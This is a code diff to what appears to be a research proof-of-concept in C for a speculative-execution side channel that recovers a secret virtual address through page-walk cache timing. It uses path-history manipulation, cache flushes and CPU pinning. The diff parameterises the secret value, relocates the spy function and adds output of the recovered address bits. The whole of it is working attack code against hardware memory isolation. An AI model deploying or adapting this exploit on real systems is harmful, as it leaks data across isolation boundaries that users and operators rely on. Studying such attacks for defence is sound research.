@@ -5,6 +5,9 @@
 #include <emmintrin.h>
 #include <time.h>
 
+//#define SECRET_VALUE 0x600018000
+#define SECRET_VALUE 0xffffff
+
 extern void set_phr(int value);
 extern void shift_phr();
 extern void clear_phr();
@@ -47,9 +50,8 @@ victim_function(void *secret_ptr, uint64_t mask, int phr) {
   }
 }
 
-__attribute__((noinline)) static void spy_function(void *secret_ptr,
-                                                   uint64_t mask, int phr) {
-
+__attribute__((noinline, section(".spy_section"))) static void
+spy_function(void *secret_ptr, uint64_t mask, int phr) {
   asm volatile("nop\n\t");
   asm volatile("nop\n\t");
   asm volatile("nop\n\t");
@@ -57,13 +59,6 @@ __attribute__((noinline)) static void spy_function(void *secret_ptr,
   asm volatile("nop\n\t");
   asm volatile("nop\n\t");
   asm volatile("nop\n\t");
-  asm volatile("nop\n\t");
-  asm volatile("nop\n\t");
-  asm volatile("nop\n\t");
-  asm volatile("nop\n\t");
-  asm volatile("nop\n\t");
-  asm volatile("nop\n\t");
-
   clear_phr();
   set_phr(phr);
 
@@ -102,25 +97,17 @@ uint64_t setup_trigger(uint64_t target, uint64_t phase, uint64_t __trash) {
 
   arch_exec = 0;
   _mm_clflush((void *)&arch_exec);
-  //_mm_clflush((void *)signal_function);
-  //_mm_clflush((void *)noise_function);
   _mm_mfence();
-  spy_function(0x12345678, ~0x7fff000000000000, 1);
+  spy_function((void *)SECRET_VALUE, ~0x7fff000000000000, 1);
   _mm_clflush((void *)&arch_exec);
-  //_mm_clflush((void *)signal_function);
-  //_mm_clflush((void *)noise_function);
   _mm_mfence();
-  spy_function(0x12345678, ~0x7fff000000000000, 1);
+  spy_function((void *)SECRET_VALUE, ~0x7fff000000000000, 1);
   _mm_clflush((void *)&arch_exec);
-  //_mm_clflush((void *)signal_function);
-  //_mm_clflush((void *)noise_function);
   _mm_mfence();
-  spy_function(0x12345678, ~0x7fff000000000000, 1);
+  spy_function((void *)SECRET_VALUE, ~0x7fff000000000000, 1);
   _mm_clflush((void *)&arch_exec);
-  //_mm_clflush((void *)signal_function);
-  //_mm_clflush((void *)noise_function);
   _mm_mfence();
-  spy_function(0x12345678, ~0x7fff000000000000, 1);
+  spy_function((void *)SECRET_VALUE, ~0x7fff000000000000, 1);
   return __trash;
 }
 
@@ -185,7 +172,7 @@ void filter_function(uint64_t target, uint64_t *noise_filter) {
 
 int main(void) {
   // pin cpu
-  pin_cpu(0);
+  pin_cpu(4);
   srand(time(0));
 
   evict_dsb();
@@ -196,7 +183,7 @@ int main(void) {
   fprintf(stderr, "Architectural derefence\n");
   fprintf(stderr, "Fast configurations\n");
   pwsc_init_reset(setup_trigger, NULL, trigger,
-                  MEMORY_MAP_ORDER_ORACLE_EVICT_SIZES, 10, 64);
+                  MEMORY_MAP_ORDER_ORACLE_EVICT_SIZES, 10, NUM_TRIALS_FAST);
 
   uint64_t init_noise_filter[64] = {0};
 
@@ -215,25 +202,31 @@ int main(void) {
   fprintf(stderr,
           "Target Secret Value: 0x%lx\tTarget's VPNs + PO are %lu %lu %lu %lu "
           "%lu\n",
-          (uint64_t)0x12345678, VPN4_TO_CACHE_LINE((uint64_t *)0x12345678),
-          VPN3_TO_CACHE_LINE((uint64_t *)0x12345678),
-          VPN2_TO_CACHE_LINE((uint64_t *)0x12345678),
-          VPN1_TO_CACHE_LINE((uint64_t *)0x12345678),
-          PO_TO_CACHE_LINE((uint64_t *)0x12345678));
+          (uint64_t)SECRET_VALUE, VPN4_TO_CACHE_LINE((uint64_t *)SECRET_VALUE),
+          VPN3_TO_CACHE_LINE((uint64_t *)SECRET_VALUE),
+          VPN2_TO_CACHE_LINE((uint64_t *)SECRET_VALUE),
+          VPN1_TO_CACHE_LINE((uint64_t *)SECRET_VALUE),
+          PO_TO_CACHE_LINE((uint64_t *)SECRET_VALUE));
   fprintf(stderr, "\n\n\n");
 
   // Run the PWSC
   struct pwsc_ans ans =
-      leak_inst_addr((uint64_t)0x12345678, init_noise_filter, 0);
+      leak_inst_addr((uint64_t)SECRET_VALUE, init_noise_filter, 0);
 
   // Stats
-  int correct_bits = bit_accuracy_checker(ans.va.va, (uint64_t)0x12345678);
+  int correct_bits = bit_accuracy_checker(ans.va.va, (uint64_t)SECRET_VALUE);
   fprintf(stderr,
           "\nRecovered Secret Value: 0x%lx\tRecovered VPNs + PO are %lu %lu "
           "%lu %lu %lu\n",
           (uint64_t)ans.va.va, VPN4_TO_CACHE_LINE(ans.va.va),
           VPN3_TO_CACHE_LINE(ans.va.va), VPN2_TO_CACHE_LINE(ans.va.va),
           VPN1_TO_CACHE_LINE(ans.va.va), PO_TO_CACHE_LINE(ans.va.va));
+
+  fprintf(stderr,
+          "Recovered VPN COs are %d %d"
+          "%d %d\n",
+          ans.va.vpn4_co, ans.va.vpn3_co, ans.va.vpn2_co, ans.va.vpn1_co);
+
   fprintf(stderr, "Correct bits: %d\tImprovement Over Random: %d\n",
           correct_bits, correct_bits - 32);
 }
